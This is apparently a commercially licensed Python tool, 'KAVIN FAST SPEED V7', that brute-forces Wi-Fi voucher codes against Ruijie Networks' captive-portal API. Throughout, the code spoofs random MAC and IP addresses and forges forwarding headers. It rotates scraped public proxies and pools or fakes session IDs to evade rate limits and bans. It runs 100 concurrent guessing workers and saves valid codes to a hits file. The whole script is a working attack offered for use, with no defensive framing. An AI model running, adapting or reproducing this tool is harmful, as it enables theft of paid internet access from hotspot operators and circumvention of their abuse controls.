# =====================================================================
# kavin_v7.py - KAVIN FAST SPEED V7 (Clean Script)
# Part 1 of 2
# =====================================================================

import os
import time
import random
import string
import json
import asyncio
import aiohttp
import urllib3
import socket
import threading
import requests
from urllib.parse import urlparse, parse_qs, quote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED, HEAVY
from rich.layout import Layout
from rich.table import Table
from rich.align import Align

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY = 100       
TIMEOUT = 3             
SID_POOL_MAX = 500      

RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": ""}

OUI_POOL = [
    "64:CC:2E", "78:11:DC", "50:8F:4C", "8C:AA:B5", "9C:99:A0",
    "8C:77:12", "34:23:BA", "C0:BD:D1", "BC:14:85", "38:AA:3C",
    "3C:2E:F9", "F0:18:98", "8C:85:90", "BC:92:6B", "D0:81:7A",
    "60:15:C7", "4C:1A:95", "A4:50:46", "5C:1A:6F", "3C:AB:8E",
]

def generate_random_mac():
    oui = random.choice(OUI_POOL)
    return f"{oui}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}".lower()

def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        return f"{seconds // 3600:02d}:{(seconds % 3600) // 60:02d}:{seconds % 60:02d}"
    except Exception: return "00:00:00"

# ============================================================
#  LICENSE & AUTO-DETECT 
# ============================================================
def check_license():
    if HAS_LICENSE_MODULE:
        try: return _license.check_approval()
        except Exception: pass
    return False, "No license module"

def activate_license(key):
    if HAS_LICENSE_MODULE:
        try: return _license.activate(key)
        except Exception as e: return False, f"Error: {e}"
    return False, "No license module"

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except: return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url',
        'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params

def auto_detect_portal():
    console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")), border_style="cyan", box=ROUNDED))
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url:
            console.print("[bold green][+][/bold green] Detected via Connectivity Check!")
            return r.url
    except: pass

    console.print("[yellow][*][/yellow] Checking Gateways...")
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
    gateways = list(dict.fromkeys(gateways))

    for gw in gateways:
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
            if "ruijienetworks" in res.url:
                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                return res.url
        except: pass
    return None

# ============================================================
#  PROXY MANAGER
# ============================================================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.index = 0

    async def fetch(self):
        urls = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
        ]
        async with aiohttp.ClientSession() as session:
            for url in urls:
                try:
                    async with session.get(url, timeout=5) as r:
                        if r.status == 200:
                            text = await r.text()
                            for line in text.splitlines():
                                line = line.strip()
                                if line and ":" in line:
                                    self.proxies.append(f"http://{line}")
                except Exception: pass
        self.proxies = list(set(self.proxies))

    async def get_proxy(self):
        if not self.proxies: return None
        self.index = (self.index + 1) % len(self.proxies)
        return self.proxies[self.index]

# ============================================================
#  SESSION FETCH & VALIDATION
# ============================================================
async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref, proxy_mgr):
    base = RUIJIE_WIFIDOG
    if "portal-mm-as" in str(gw_params.get("url", "")):
        base = base.replace("portal-as", "portal-mm-as")

    temp_params = dict(gw_params)
    temp_params['mac'] = current_mac_ref[0]
    temp_params['ip'] = current_ip_ref[0]

    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
    full_url = f"{base}?{params_str}"

    headers = {
        'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{current_mac_ref[0]}',
        'Client-Mac': current_mac_ref[0],
        'X-Forwarded-For': current_ip_ref[0],
        'Connection': 'close'
    }

    proxy = await proxy_mgr.get_proxy()

    try:
        session.cookie_jar.clear()
        async with session.get(full_url, headers=headers, proxy=proxy, timeout=5, allow_redirects=False) as resp:
            location = resp.headers.get('Location', '')
            
            if location:
                loc_lower = location.lower()
                if ("request limited" in loc_lower or "error.html" in loc_lower or "banned" in loc_lower):
                    return "BAN", "Banned"

                q = parse_qs(urlparse(location).query)
                sid = q.get('sessionId', [None])[0]
                if sid:
                    return {
                        'sessionId': sid,
                        'sign': q.get('sign', [None])[0],
                        'timestamp': q.get('timestamp', [None])[0],
                        'mac': current_mac_ref[0],
                        'ip': current_ip_ref[0],
                        'proxy': proxy,
                        'used': 0
                    }, "REAL"
    except Exception:
        pass

    fake_sid = f"fake_sess_{random.randint(1000,9999)}"
    return {
        'sessionId': fake_sid,
        'sign': None,
        'timestamp': None,
        'mac': current_mac_ref[0],
        'ip': current_ip_ref[0],
        'proxy': proxy,
        'used': 0
    }, "FAKE"

async def test_code_official(session, sess_data, code):
    url = RUIJIE_VOUCHER
    if sess_data.get('sign') and sess_data.get('timestamp'):
        url += f"&sign={sess_data['sign']}&timestamp={sess_data['timestamp']}"

    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12)",
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess_data['sessionId']}",
        "Client-Mac": sess_data['mac'],
        "X-Forwarded-For": sess_data['ip'],
    }

    payload = {
        "accessCode": code,
        "sessionId": sess_data['sessionId'],
        "apiVersion": 1,
    }
    if sess_data.get('sign'): payload["sign"] = sess_data['sign']
    if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']

    try:
        async with session.post(url, json=payload, headers=headers, proxy=sess_data['proxy'], timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
            if r.status == 429: return "__RATE_LIMITED__", "1HR"

            text = await r.text()
            if not text: return "__NETWORK_ERROR__", "1HR"

            final_url = str(r.url).lower()
            low = text.lower()
            if ("request%20limited" in final_url or "request limited" in final_url or "request limited" in low or "too many" in low):
                return "__RATE_LIMITED__", "1HR"

            if "session timed out" in low or "invalid session" in low:
                return "__SESSION_EXPIRED__", "1HR"

            plan = "1HR"
            if "2hr" in low or "2 hour" in low: plan = "2HR"
            elif "12hr" in low or "12 hour" in low: plan = "12HR"
            elif "24hr" in low or "1day" in low or "24 hour" in low: plan = "24HR"

            return text, plan
    except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
    except aiohttp.ClientError: return "__NETWORK_ERROR__", "1HR"
    except Exception as e: return f"__ERROR__:{type(e).__name__}", "1HR"

# ============================================================
#  CODE GENERATOR
# ============================================================
seq_counter = 0
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            with seq_lock:
                seq_counter += 1
                current = seq_counter
            if mode == "num": return str(current).zfill(length)
            elif mode == "eng":
                s, n = "", current
                for _ in range(length): s = chr(ord('a') + (n % 26)) + s; n //= 26
                return s
            elif mode == "mix":
                chars = string.ascii_lowercase + string.digits
                s, n = "", current
                for _ in range(length): s = chars[n % 36] + s; n //= 36
                return s
        else:
            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""
  # =====================================================================
# kavin_v7.py - KAVIN FAST SPEED V7 (Clean Script)
# Part 2 of 2
# =====================================================================

def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count, sess_stat, sess_id, pool_size, proxy_count):
    layout = Layout()
    header_text = Text("⚡ KAVIN FAST SPEED V7 (ULTIMATE) ⚡", style="bold bright_cyan", justify="center")
    layout.split_column(Layout(Panel(Align.center(header_text), border_style="cyan", box=HEAVY), size=3), Layout(name="body", ratio=1))

    stats = Table.grid(expand=True, padding=(0, 1))
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold cyan", justify="left")
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold green", justify="left")

    status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() else "bold green"
    
    if sess_stat == "REAL":
        sess_text = f"REAL ({sess_id[:6]}...)"
        sess_style = "bold green"
    elif sess_stat == "FAKE":
        sess_text = f"FAKE ({sess_id[:6]}...)"
        sess_style = "bold yellow"
    elif sess_stat == "EXPIRED":
        sess_text = "EXPIRED (Refreshing...)"
        sess_style = "bold red"
    else:
        sess_text = sess_stat
        sess_style = "bold cyan"

    stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
    stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
    stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
    stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
    stats.add_row("  💾 This Run", f": {tried_count:,}",         "  🔐 Session", f": {sess_text}", style=sess_style)
    stats.add_row("  🌐 Proxies", f": {proxy_count:,}",          "  💧 SID Pool", f": {pool_size:,}")

    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
    check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)

    v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
    v_table.add_column("Voucher Hits", style="bold green", justify="center")
    v_table.add_column("Plan", style="bold green", justify="center")
    v_table.add_column("Remaining", style="bold green", justify="center")

    for h in hits:
        v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")

    if not hits: v_table.add_row("", "", "")

    footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)

    body_layout = Layout()
    body_layout.split_column(
        Layout(stats_panel, size=9), 
        Layout(check_panel, size=3), 
        Layout(v_table, ratio=1), 
        Layout(footer_panel, size=3)
    )
    layout["body"].update(body_layout)
    return layout

# ============================================================
#  SCAN WORKERS & FETCHERS
# ============================================================
async def sid_fetcher(session, gw_params, sid_pool, proxy_mgr, state, stop_event):
    while not stop_event.is_set():
        try:
            if sid_pool.qsize() >= SID_POOL_MAX:
                await asyncio.sleep(0.1)
                continue

            mac = [generate_random_mac()]
            ip = [generate_random_ip()]
            
            res, err_msg = await fetch_official_session(session, gw_params, mac, ip, proxy_mgr)

            if res == "BAN":
                state['sess_stat'] = "BANNED"
                continue

            await sid_pool.put(res)
            state['pool_size'] = sid_pool.qsize()
            
        except Exception:
            pass
        await asyncio.sleep(0.05)

async def scan_worker(session, voucher_queue, sid_pool, state, stop_event):
    while not stop_event.is_set():
        try:
            try:
                sid_data = await asyncio.wait_for(sid_pool.get(), timeout=1.0)
            except asyncio.TimeoutError:
                state['status'] = "Waiting for SID..."
                continue

            try:
                code = await asyncio.wait_for(voucher_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                await sid_pool.put(sid_data)
                continue

            state['sess_stat'] = "REAL" if not sid_data['sessionId'].startswith("fake") else "FAKE"
            state['sess_id'] = sid_data['sessionId']

            res, plan = await test_code_official(session, sid_data, code)

            state['tested'] += 1
            state['current_code'] = code

            if res in ("__TIMEOUT__", "__NETWORK_ERROR__", "__RATE_LIMITED__", "__SESSION_EXPIRED__"):
                if res == "__RATE_LIMITED__":
                    state['sess_stat'] = "BANNED"
            else:
                sid_data['used'] += 1
                if sid_data['used'] < 5: 
                    await sid_pool.put(sid_data)

                low = res.lower()
                is_hit = False
                try:
                    j = json.loads(res)
                    if j.get("success") is True and isinstance(j.get("result"), dict):
                        if j["result"].get("logonUrl"): is_hit = True
                except Exception:
                    if ('"success":true' in low or '"authresult":"1"' in low or "congratulations" in low): is_hit = True

                if is_hit:
                    now_str = time.strftime("%H:%M:%S")
                    state['hits'].append({"code": code, "time": now_str, "plan": plan})
                    try:
                        with open(HITS_FILE, "a", encoding="utf-8") as f:
                            f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                    except Exception: pass
                    
                    state['sess_stat'] = "HIT (Refreshing)"

            await voucher_queue.put(gen_code(state['mode'], state['length'], state['scan_method']))
            
        except asyncio.CancelledError:
            break
        except Exception:
            pass

async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
    if not gw_params:
        gw_params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.2",
            "mac": "", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245",
            "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    mode_str = f"{mode}_{length}"
    
    state = {
        'mode': mode, 'length': length, 'scan_method': scan_method,
        'tested': 0, 'hits': [], 'current_code': '----',
        'status': 'Init', 'sess_stat': 'FAKE', 'sess_id': '--------',
        'pool_size': 0
    }

    stop_event = asyncio.Event()
    sid_pool = asyncio.Queue(maxsize=SID_POOL_MAX)
    voucher_queue = asyncio.Queue()
    
    proxy_mgr = ProxyManager()
    state['status'] = "Fetching Proxies..."
    await proxy_mgr.fetch()

    for _ in range(CONCURRENCY * 2):
        voucher_queue.put_nowait(gen_code(mode, length, scan_method))

    conn_limit = aiohttp.TCPConnector(limit=200, ssl=False)
    start_time = time.time()

    async with aiohttp.ClientSession(connector=conn_limit) as session:
        live = Live(get_dashboard_renderable(mode_str, scan_method, "", 0, "00:00:00", state['status'], [], 0, "--------", "----", 0, state['sess_stat'], state['sess_id'], 0, len(proxy_mgr.proxies)), refresh_per_second=4, screen=False)

        with live:
            fetcher_tasks = [asyncio.create_task(sid_fetcher(session, gw_params, sid_pool, proxy_mgr, state, stop_event)) for _ in range(30)]
            worker_tasks = [asyncio.create_task(scan_worker(session, voucher_queue, sid_pool, state, stop_event)) for _ in range(CONCURRENCY)]

            try:
                while True:
                    elapsed = time.time() - start_time
                    speed = (state['tested'] / elapsed * 60) if elapsed > 0 else 0.0
                    
                    mac_disp = "00:00:00:00:00:00"
                    ip_disp = "192.168.110.1"
                    
                    live.update(get_dashboard_renderable(
                        mode_str, scan_method, state['current_code'], state['tested'], 
                        format_time(elapsed), state['status'], state['hits'], speed, 
                        mac_disp, ip_disp, state['tested'], state['sess_stat'], 
                        state['sess_id'], state['pool_size'], len(proxy_mgr.proxies)
                    ))
                    
                    await asyncio.sleep(0.25)

            except (KeyboardInterrupt, asyncio.CancelledError):
                stop_event.set()
                for t in fetcher_tasks + worker_tasks:
                    t.cancel()
                live.stop()
                console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
            except Exception as e:
                live.stop()
                console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")

def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V7 (ULTIMATE) ⚡", style="bold bright_white"), justify="center")
    console.print(Text("SID Pooling + Proxy Rotation + High Speed", style="bold bright_yellow"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3"): continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Voucher Length:[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3", "4"): continue
        return {"1": 6, "2": 7, "3": 8, "4": 9}[choice]

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2"): continue
        return {"1": "random", "2": "sequential"}[choice]

def run():
    show_banner()
    portal_url = auto_detect_portal()

    gw_params = None
    if portal_url:
        extracted = extract_params_from_url(portal_url)
        console.print(f"[bold green][+][/bold green] URL fetched successfully!")
        time.sleep(1)

        gw_params = {
            "stage": "portal",
            "gw_id": extracted.get("gw_id", "c4b25be7d323"),
            "gw_sn": extracted.get("gw_sn", "H1U320P00210A"),
            "gw_address": extracted.get("gw_address", "192.168.7.1"),
            "gw_port": extracted.get("gw_port", "2060"),
            "ip": generate_random_ip(),
            "mac": "",
            "slot_num": extracted.get("slot_num", "14"),
            "nasip": extracted.get("nasip", "192.168.1.193"),
            "ssid": extracted.get("ssid", "VLAN7"),
            "ustate": "0", "mac_req": "1",
            "url": extracted.get("url", "http://connectivitycheck.gstatic.com/generate_204"),
            "chap_id": extracted.get("chap_id", r"\245"),
            "chap_challenge": extracted.get("chap_challenge", r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
        }
    else:
        console.print("[bold red][-][/bold red] Auto-detect failed. Using default gateway params.")
        time.sleep(1.5)

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_method = ask_scan_method()
        if scan_method is None: continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method, gw_params=gw_params))
        except KeyboardInterrupt: pass
        break

def main():
    global LICENSE_INFO
    try:
        is_valid, expiry_msg = check_license()
        while not is_valid:
            clear_screen()
            console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V7 ⚡", style="bold bright_magenta")), border_style="bright_magenta"))
            console.print(Panel(Align.center(Text("🔐 Enter License Key to Continue 🔐", style="bold yellow")), border_style="yellow"))
            key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()
            if key:
                ok, msg = activate_license(key)
                console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")), border_style="green" if ok else "red"))
                time.sleep(2)
                is_valid, expiry_msg = check_license()
            else: time.sleep(1)

        LICENSE_INFO["status"] = expiry_msg
        run()
    except (KeyboardInterrupt, EOFError):
        console.print("\n\n[bold red]Exiting Kavin Scanner V7...[/bold red]\n")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
    finally:
        try: clear_screen()
        except Exception: pass
        try:
            console.print("\n\n")
            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏", style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(1)
        except Exception: pass

if __name__ == "__main__":
    main()
